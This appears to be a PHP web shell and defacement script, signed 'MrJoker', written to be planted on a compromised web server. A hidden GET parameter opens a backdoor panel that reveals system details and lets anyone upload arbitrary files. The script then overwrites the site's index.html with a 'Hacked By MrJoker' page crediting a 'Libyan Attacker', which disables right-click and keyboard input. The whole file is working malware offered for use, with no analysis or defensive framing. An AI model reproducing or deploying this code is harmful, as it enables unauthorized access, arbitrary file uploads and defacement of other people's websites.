<?php 
// name of the file is: Æ˜i (it has no extension)
error_reporting(0);

if(isset($_GET["1337"]))
	{
		echo "MrJoker\n";echo"<font color=#000FFF>[uname]".php_uname()."[/uname]";echo "<br>";print "\n";if(@ini_get("disable_functions")){echo "DisablePHP=".@ini_get("disable_functions");}else{ echo "Disable PHP = NONE";}echo "<br>";print "\n";if(@ini_get("safe_mode")){echo "Safe Mode = ON";}else{ echo "Safe Mode = OFF";} echo "<br>";print "\n";echo"<form method=post enctype=multipart/form-data>";echo"<input type=file name=f><input name=v type=submit id=v value=up><br>";if($_POST["v"]==up){if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){echo"<b>berhasil</b>-->".$_FILES["f"]["name"];}else{echo"<b>gagal";}} }

echo 'uname:'.php_uname()."\n";
echo getcwd() . "\n";

$file = "
<html><head><link rel='icon' type='image/gif' href='http://img.freeflagicons.com/thumb/round_icon/libya/libya_640.png'>
<meta http-equiv='content-type' content='text/html; charset=UTF-8'></head>
<body oncontextmenu='return false;' onkeydown='return false;' onmousedown='return false;' bgcolor='#000000'>
<script language='JavaScript1.2'>
function ClearError() {return true;}
window.onerror = ClearError;
</script>

</style><script>
window.onload = function() {
var h1 = document.getElementsByTagName('h1')[0],
text = h1.innerText || h1.textContent,
split = [], i, lit = 0, timer = null;
for(i = 0; i < text.length; ++i) {
split.push('<span>' + text[i] + '</span>');
}
h1.innerHTML = split.join('');
split = h1.childNodes;

var flicker = function() {
lit += 0.01;
if(lit >= 1) {
clearInterval(timer);
}
for(i = 0; i < split.length; ++i) {
if(Math.random() < lit) {
split[i].className = 'neon';
} else {
split[i].className = '';
}
}
}
setInterval(flicker, 100);
}
</script>
<body>
<meta http-equiv='Content-Language' content='en-us'>
<meta name='keywords' content='Hacked By MrJoker'>
<meta name='description' content='Hacked By MrJoker'>
<title>Hacked By MrJoker</title>
<style type='text/css'>body, a, a:hover {cursor: url(http://www.flags.net/images/smallflags/LBYA0001.GIF), progress;}</style>  
<style type='text/css'>
body {
background: black url('http://s4.picofile.com/file/7800889886/rainy.gif');


background-repeat: repeat;
background-position: center;
background-attachment: fixed;
}
.korza {
  -webkit-transition: all 0.5s ease;
     -moz-transition: all 0.5s ease;
       -o-transition: all 0.5s ease;
      -ms-transition: all 0.5s ease;
          transition: all 0.5s ease;
}
 
.korza:hover {
  border-radius: 50%;
  -webkit-transform: rotate(360deg);
     -moz-transform: rotate(360deg);
       -o-transform: rotate(360deg);
      -ms-transform: rotate(360deg);
          transform: rotate(360deg);
}
img {
   padding:3px;
   border:3px solid white;
}
   </style>

<center>
<font face='Titillium Web' color='red'><b>
<h2>Hacked By MrJoker</h2></b></font><b>
<img src='https://1.bp.blogspot.com/-c42bpz59cIs/Vry9d2rcmGI/AAAAAAAAA0c/Do7JuOQklRw/s1600/lulz%2Bsec.jpg' class='korza' alt='Hacked By MrJoker'>
<font face='Righteous' color='white'>
<p>B0xEd By Libyan Attacker</p>
<p>Hacked For How Many Reasons , First Reason</p>
<p>That The Server Not Secured .</p>
<p>Second Reason I Want To Say Hi :)</p>
<p>Third Reason I Missed My Home ( S3c-k ) ;P</p>
<p>Good Bye</p>
<p><font color='red'>MrJoker Was Here</font></p>
<p>Contact : <a href='https://www.facebook.com/profile.php?id=100006577505942'>My_Facebook</a></p>
<p><h2><font color='Pink'>Greet'z To: Libyan Root - Ly General - Ly HaXor - Scorpio Ly - Alansary LY - Moneer Masoud</font></h3></p>
<p><font color='lime'>To be continued...</font></p><font color='lime'>
</font></font></b></center></body></html>
";


$r=fopen("../../../index.html", "w"); fwrite($r,$file); fclose($r);


?>